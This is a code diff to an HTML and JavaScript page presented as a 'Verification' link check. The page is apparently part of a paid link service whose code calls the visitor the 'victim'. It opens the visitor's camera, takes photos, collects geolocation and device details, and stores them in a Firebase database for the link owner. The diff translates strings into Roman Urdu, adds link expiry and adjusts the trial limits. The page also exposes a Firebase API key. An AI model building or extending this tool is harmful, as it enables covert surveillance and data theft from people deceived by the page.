@@ -1,17 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ur">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Verification Required</title>
+<title>Verification</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
 <style>
   :root{--bg-0:#05070f;--accent:#22d3ee;--accent-2:#a855f7;--accent-3:#10b981;--danger:#ef4444;--text:#fff;--glass:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.08);}
   *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
-  html,body{height:100%;overflow-x:hidden;}
-  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg-0);color:var(--text);min-height:100vh;-webkit-font-smoothing:antialiased;position:relative;}
-  body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 15% 0%,rgba(168,85,247,0.4) 0%,transparent 50%),radial-gradient(ellipse at 85% 100%,rgba(34,211,238,0.35) 0%,transparent 50%);z-index:-2;animation:bgFloat 25s ease-in-out infinite;}
-  @keyframes bgFloat{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg-0);color:var(--text);min-height:100vh;position:relative;}
+  body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 15% 0%,rgba(168,85,247,0.4) 0%,transparent 50%),radial-gradient(ellipse at 85% 100%,rgba(34,211,238,0.35) 0%,transparent 50%);z-index:-2;}
   .container{max-width:560px;margin:0 auto;padding:20px 18px 40px;}
   .hidden{display:none !important;}
   .card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:22px;padding:24px;margin-bottom:18px;box-shadow:0 20px 50px rgba(0,0,0,0.4);}
@@ -48,7 +46,7 @@
 
 <div id="loadingView" class="container" style="text-align:center;padding-top:100px;">
   <div class="spinner"></div>
-  <p style="opacity:0.6;font-size:0.9rem;">Verifying link...</p>
+  <p style="opacity:0.6;font-size:0.9rem;">Link check ho raha hai...</p>
 </div>
 
 <div id="mainView" class="container hidden">
@@ -75,7 +73,7 @@
 
   <div class="card hidden" id="victimSuccessCard" style="text-align:center;">
     <div class="success-circle">✓</div>
-    <h2 style="font-family:'Space Grotesk',sans-serif;justify-content:center;text-align:center;">Verified!</h2>
+    <h2 style="font-family:'Space Grotesk',sans-serif;text-align:center;">Verified!</h2>
     <p style="opacity:0.7;margin-top:10px;text-align:center;">Aapka data submit ho gaya. Aap ye page band kar sakte hain.</p>
   </div>
 
@@ -83,16 +81,15 @@
     <div class="alert-box">
       <div class="icon">🔒</div>
       <h3>Link Expired</h3>
-      <p>Ye link ab valid nahi hai. Please provider se naya link mangwayein.</p>
+      <p>Ye link 30 minute me expire ho gaya hai. Please provider se naya link mangwayein.</p>
     </div>
   </div>
 </div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-import { getFirestore, collection, addDoc, doc, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+import { getFirestore, collection, addDoc, doc, getDoc, serverTimestamp, Timestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-/* ========== SAME FIREBASE CONFIG ========== */
 const firebaseConfig = {
   apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
   authDomain: "decision-b42a6.firebaseapp.com",
@@ -112,14 +109,12 @@ let currentLinkId = null;
 let stream = null;
 let facingMode = "user";
 
-/* ========== HELPERS ========== */
 const ALL_VIEWS = ["loadingView","mainView"];
 function showView(id) {
   ALL_VIEWS.forEach(v => document.getElementById(v).classList.add("hidden"));
   document.getElementById(id).classList.remove("hidden");
 }
 
-/* ========== ON LOAD ========== */
 window.addEventListener("load", async () => {
   const hash = location.hash;
   if (!hash.startsWith("#v=")) {
@@ -142,13 +137,24 @@ window.addEventListener("load", async () => {
     }
 
     const linkData = linkSnap.data();
+
+    // ⏰ CHECK EXPIRY
+    if (linkData.expiresAt) {
+      const expMs = linkData.expiresAt.seconds ? linkData.expiresAt.seconds * 1000 : new Date(linkData.expiresAt).getTime();
+      if (Date.now() > expMs) {
+        showView("mainView");
+        document.getElementById("victimActionCard").classList.add("hidden");
+        document.getElementById("victimErrorCard").classList.remove("hidden");
+        return;
+      }
+    }
+
     currentFeature = linkData.feature;
 
-    // Check owner trial
     const ownerSnap = await getDoc(doc(db, "users", linkData.ownerId));
     if (ownerSnap.exists()) {
       const owner = ownerSnap.data();
-      if (owner.plan === "trial" && (owner.linksUsed || 0) > FREE_TRIAL_LIMIT) {
+      if (owner.plan === "trial" && (owner.linksUsed || 0) > FREE_TRIAL_LIMIT + 1) {
         showView("mainView");
         document.getElementById("victimActionCard").classList.add("hidden");
         document.getElementById("victimErrorCard").classList.remove("hidden");
@@ -181,7 +187,6 @@ function setupVictimView(feature) {
   document.getElementById("victimDesc").textContent = descs[feature] || "";
 }
 
-/* ========== VICTIM ACTIONS ========== */
 window.victimStart = async function() {
   if (currentFeature === "camera" || currentFeature === "video" || currentFeature === "all") {
     await startVictimCamera();
@@ -221,25 +226,18 @@ window.victimSwitchCam = async function() {
 window.victimCapture = async function() {
   const video = document.getElementById("video");
   if (!video.videoWidth) return;
-
   const flash = document.getElementById("flash");
   flash.classList.add("active");
   setTimeout(() => flash.classList.remove("active"), 130);
-
   const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   const ctx = canvas.getContext("2d");
-  if (facingMode === "user") {
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-  }
+  if (facingMode === "user") { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
   ctx.drawImage(video, 0, 0);
-
   const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
   const location = await getLocation();
   const device = getDeviceInfo();
-
   await saveVictimData("photo", { photo: dataUrl, location, device });
   if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
   showVictimSuccess();
@@ -257,7 +255,6 @@ function showVictimSuccess() {
   document.getElementById("victimSuccessCard").classList.remove("hidden");
 }
 
-/* ========== LOCATION & DEVICE ========== */
 function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return resolve(null);
@@ -279,7 +276,6 @@ function getDeviceInfo() {
   return { type, browser, platform: navigator.platform || "-", screen: `${screen.width}x${screen.height}`, language: navigator.language };
 }
 
-/* ========== SAVE DATA ========== */
 async function saveVictimData(type, data) {
   if (!currentLinkId) return;
   try {
@@ -293,9 +289,7 @@ async function saveVictimData(type, data) {
       ...data,
       timestamp: serverTimestamp()
     });
-  } catch (e) {
-    console.error(e);
-  }
+  } catch (e) { console.error(e); }
 }
 </script>
 </body>
